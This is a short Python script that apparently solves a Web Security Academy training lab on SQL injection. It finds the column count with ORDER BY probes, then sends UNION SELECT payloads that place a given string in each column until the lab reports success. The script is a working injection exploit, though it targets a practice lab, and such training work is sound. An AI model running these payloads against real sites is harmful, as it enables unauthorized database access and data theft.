# Retrieving data from other database tables
# Union 2 - Finding columns with a useful data type in an SQL injection UNION attack

import requests
url = "https://ace91f191e10345d80a30dbf006100af.web-security-academy.net/filter?category=Lifestyle"

def enum_columns():
    '''
    Get valid number of columns using ORDER BY query
    '''
    for x in range(1,10):
        payload = f"' ORDER BY {x}--"
        r = requests.get(url+payload)
        if r.status_code == 500:
            break
    return x-1

def generate_payload(size, loop_no):
    '''
    Generates a payload containing the string to be matched iterating over the number of columns
    '''
    nulls = ['NULL']*size
    nulls[loop_no] = "'e9dpI1'" # String to be matched - given in the exercise
    payload = "' UNION SELECT "
    payload += ",".join(nulls)
    payload += "--"
    return payload

size = enum_columns()
try:
    for x in range(size):
        payload = generate_payload(size, x)
        print(f"Loop: {x}, using payload {payload}")
        r_solve = requests.get(url+payload)
        if "Congratulations, you solved the lab!" in r_solve.text:
            print("yeet!")
            break
        else:
            print("sad noises :(")
except Exception as e:
    print("Something went wrong:", e)